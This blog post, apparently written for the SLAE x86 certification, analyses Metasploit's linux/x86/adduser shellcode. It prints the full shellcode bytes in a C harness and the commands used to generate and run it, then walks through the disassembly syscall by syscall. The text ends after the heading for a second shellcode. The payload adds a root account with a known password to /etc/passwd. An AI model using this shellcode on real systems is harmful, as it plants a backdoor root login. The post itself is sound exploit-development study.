---
title:  "SLAE x86 Assignment 5: MSFVenom Shellcode Analysis"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will take a look at assignment 5 of the SLAE x86 certification, which requires us to analyse three MSFVenom shellcodes. Let's dive right in!

## Shellcode 1: linux/x86/adduser ##
Let's start off with something simple. This payload adds a new user to the ```/etc/passwd``` file. Let's have a look at the configurable options:
```
$ msfvenom -p linux/x86/adduser --list-options
Options for payload/linux/x86/adduser:
=========================


       Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create
```
So the basic options show us that it takes the username, password, and shell for this user as arguments. Let's generate some test shellcode:
```
$ msfvenom -p linux/x86/adduser -f c -o adduser USER=metasploit PASS=metasploit
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
Saved as: adduser
```
We paste this in ```shellcode.c```, and compile and run:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
shellcode.c:12:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
   12 | main()
      | ^~~~
$ sudo ./shellcode
[sudo] password for kali:
Shellcode Length:  40
$ grep metasploit /etc/passwd
metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
```
So as you can see, a new user with the username ```metasploit``` is added. Let's now analyse how the shellcode works.

### Analysis
Let's take this into ```gdb``` and disassemble the code:
```
Breakpoint 1, 0x00404040 in code ()
gdb-peda$ disas
Dump of assembler code for function code:
=> 0x00404040 <+0>:     xor    ecx,ecx
   0x00404042 <+2>:     mov    ebx,ecx
   0x00404044 <+4>:     push   0x46
   0x00404046 <+6>:     pop    eax
   0x00404047 <+7>:     int    0x80
   0x00404049 <+9>:     push   0x5
   0x0040404b <+11>:    pop    eax
   0x0040404c <+12>:    xor    ecx,ecx
   0x0040404e <+14>:    push   ecx
   0x0040404f <+15>:    push   0x64777373
   0x00404054 <+20>:    push   0x61702f2f
   0x00404059 <+25>:    push   0x6374652f
   0x0040405e <+30>:    mov    ebx,esp
   0x00404060 <+32>:    inc    ecx
   0x00404061 <+33>:    mov    ch,0x4
   0x00404063 <+35>:    int    0x80
   0x00404065 <+37>:    xchg   ebx,eax
   0x00404066 <+38>:    call   0x404093 <code+83>
   0x0040406b <+43>:    ins    DWORD PTR es:[edi],dx
   0x0040406c <+44>:    gs je  0x4040d0
   0x0040406f <+47>:    jae    0x4040e1
   0x00404071 <+49>:    ins    BYTE PTR es:[edi],dx
   0x00404072 <+50>:    outs   dx,DWORD PTR ds:[esi]
   0x00404073 <+51>:    imul   esi,DWORD PTR [edx+edi*1+0x41],0x49642f7a
   0x0040407b <+59>:    jae    0x4040e7
   0x0040407d <+61>:    xor    al,0x70
   0x0040407f <+63>:    xor    al,0x49
   0x00404081 <+65>:    push   edx
   0x00404082 <+66>:    arpl   WORD PTR [edx],di
   0x00404084 <+68>:    xor    BYTE PTR [edx],bh
   0x00404086 <+70>:    xor    BYTE PTR [edx],bh
   0x00404088 <+72>:    cmp    ch,BYTE PTR [edi]
   0x0040408a <+74>:    cmp    ch,BYTE PTR [edi]
   0x0040408c <+76>:    bound  ebp,QWORD PTR [ecx+0x6e]
   0x0040408f <+79>:    das    
   0x00404090 <+80>:    jae    0x4040fa
   0x00404092 <+82>:    or     bl,BYTE PTR [ecx-0x75]
   0x00404095 <+85>:    push   ecx
   0x00404096 <+86>:    cld    
   0x00404097 <+87>:    push   0x4
   0x00404099 <+89>:    pop    eax
   0x0040409a <+90>:    int    0x80
   0x0040409c <+92>:    push   0x1
   0x0040409e <+94>:    pop    eax
   0x0040409f <+95>:    int    0x80
   0x004040a1 <+97>:    add    BYTE PTR [eax],al
End of assembler dump.
```
So right off the bat, the disassembly is quite long. But we don't need to concern ourselves with every single instruction. A few notes can be taken:
- There is an ```int 0x80``` instruction at ```0x00404047```. ```eax``` holds ```0x46``` which is the syscall number.
- The ```push``` instructions at ```0x0040404f```, ```0x00404054``` and ```0x00404059``` look like parameters.
- Another ```int 0x80``` at ```0x00404063```, with syscall number ```0x5``` in ```eax``` and a pointer to our arguments in ```ebx```.
- The ```call``` at ```0x00404066``` is worth looking into.

Alright, so let's start off by checking out the first ```int 0x80```, with the syscall number ```0x46```(70):
```
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_setreuid 70
```
So this is a call to the ```setreuid()``` function. It takes the following arguments:
```c
SYNOPSIS         top
       #include <sys/types.h>
       #include <unistd.h>

       int setreuid(uid_t ruid, uid_t euid);
```
This function is responsible for making sure that this program runs as root. This explains the two 0s as the arguments in ```ecx``` and ```ebx```:
```nasm
0x00404040 <+0>:     xor    ecx,ecx     ;ecx=0
0x00404042 <+2>:     mov    ebx,ecx     ;ebx=0
0x00404044 <+4>:     push   0x46        ;70 --> setreuid()
0x00404046 <+6>:     pop    eax
0x00404047 <+7>:     int    0x80        ;syscall
```    
The second syscall with the number ```0x5``` is a call to the ```open()``` function:
```
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_open 5
```
This is probably created in order to setup the descriptors for editing ```/etc/passwd```. These are the arguments that it takes:
```c
SYNOPSIS         top
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

       int open(const char *pathname, int flags);
```
So it takes a pointer to the filename, and access flags. These flags can be found in the ```fcntl.h``` header file. Keep in mind that these flags are in octal:
```c
#define O_ACCMODE	00000003
#define O_RDONLY	00000000
#define O_WRONLY	00000001
#define O_RDWR		00000002
#define O_CREAT		00000100
#define O_EXCL		00000200
#define O_NOCTTY	00000400
#define O_TRUNC		00001000
#define O_APPEND	00002000
.. and so on
```
So ```ecx``` serves as our ```NULLs``` in order to null-terminate the string ```/etc//passwd```(starting at ```0x6374652f```). Then, a pointer to that string is stored in ```ebx```. Then, the value of ```0x401```(2001 in octal) is stored in ```ecx```. which means that the ```O_APPEND``` and ```O_WRONLY``` flags are used. This means that the file is opened for write-only and appending.  
```nasm
0x00404049 <+9>:     push   0x5
0x0040404b <+11>:    pop    eax           ;eax=0x5 --> open()
0x0040404c <+12>:    xor    ecx,ecx   
0x0040404e <+14>:    push   ecx           ;nulls
0x0040404f <+15>:    push   0x64777373    ;/etc//passwd string null-terminated
0x00404054 <+20>:    push   0x61702f2f
0x00404059 <+25>:    push   0x6374652f
0x0040405e <+30>:    mov    ebx,esp       ;pointer to string
0x00404060 <+32>:    inc    ecx           ;ecx=0x1
0x00404061 <+33>:    mov    ch,0x4        ;ecx=0x401 --> O_WRONLY and O_APPEND
0x00404063 <+35>:    int    0x80          ;syscall
0x00404065 <+37>:    xchg   ebx,eax
```
The ```xchng``` after the syscall switches the values stored in ```ebx``` and ```eax```. So ```eax``` has the pointer to our string and ```ebx``` has ```0x3```.

In order to understand what that call at ```0x00404066``` does, I set a breakpoint at the address that it's calling, which is ```0x404093```:
```
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff1ac ("/etc//passwd")
EBX: 0xfffffff3
ECX: 0x401
EDX: 0x40201e --> 0x1b010000
ESI: 0xb7fb8000 --> 0x1dfd6c
EDI: 0xb7fb8000 --> 0x1dfd6c
EBP: 0xbffff1d8 --> 0x0
ESP: 0xbffff1a8 --> 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
EIP: 0x404093 --> 0xfc518b59
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x404093 <code+83>:  pop    ecx
   0x404094 <code+84>:  mov    edx,DWORD PTR [ecx-0x4]
   0x404097 <code+87>:  push   0x4
   0x404099 <code+89>:  pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff1a8 --> 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
0004| 0xbffff1ac ("/etc//passwd")
0008| 0xbffff1b0 ("//passwd")
0012| 0xbffff1b4 ("sswd")
0016| 0xbffff1b8 --> 0x0
0020| 0xbffff1bc --> 0x4011f9 (<main+80>:       mov    eax,0x0)
0024| 0xbffff1c0 --> 0x1
0028| 0xbffff1c4 --> 0xbffff284 --> 0xbffff41d ("/home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass5/shellcode")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```
So from the upper half, we can gather that our username, password and shell parameters are stored at ```esp```, and after the ```call``` executes, it will be popped into ```ecx```:
```
gdb-peda$ stepi
[----------------------------------registers-----------------------------------]
EAX: 0xbffff1ac ("/etc//passwd")
EBX: 0xfffffff3
ECX: 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
...

...
[-------------------------------------code-------------------------------------]
=> 0x404094 <code+84>:  mov    edx,DWORD PTR [ecx-0x4]
   0x404097 <code+87>:  push   0x4
   0x404099 <code+89>:  pop    eax
   0x40409a <code+90>:  int    0x80
```
So, this is the part of the code that passes our parameters for ```write()```:
```nasm
0x404093 <code+83>:  pop    ecx                         ;username,passwd,shell
0x404094 <code+84>:  mov    edx,DWORD PTR [ecx-0x4]     ;length
0x404097 <code+87>:  push   0x4                          
0x404099 <code+89>:  pop    eax                         ;eax=0x4 --> write()
0x40409a <code+90>:  int    0x80                        ;syscall
```
Then, the ```write()``` function is executed, which has a syscall number of ```0x4```:
```
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_write 4

SYNOPSIS         top
       #include <unistd.h>

       ssize_t write(int fd, const void *buf, size_t count);

```
So this takes the file descriptor as the first argument, data as the second, followed by the length of the data:
```
0x00404099 in code ()
gdb-peda$ stepi
[----------------------------------registers-----------------------------------]
EAX: 0x4
EBX: 0xfffffff3
ECX: 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
EDX: 0x28 ('(')
...

...
[-------------------------------------code-------------------------------------]
   0x404096 <code+86>:  cld    
   0x404097 <code+87>:  push   0x4
   0x404099 <code+89>:  pop    eax
=> 0x40409a <code+90>:  int    0x80
```
Then finally, the ```exit()``` function is called, with the syscall number ```0x1```:
```nasm
0x0040409c <+92>:    push   0x1     
0x0040409e <+94>:    pop    eax       ;eax=0x1 --> exit()
0x0040409f <+95>:    int    0x80      ;syscall
```

## Shellcode 2: linux/x86/chmod ##
Now let's have a look at a ```chmod``` shellcode. This shellcode helps in changing the permissions of a particular file, when supplied with a desired mode. Let's look at the basic options:
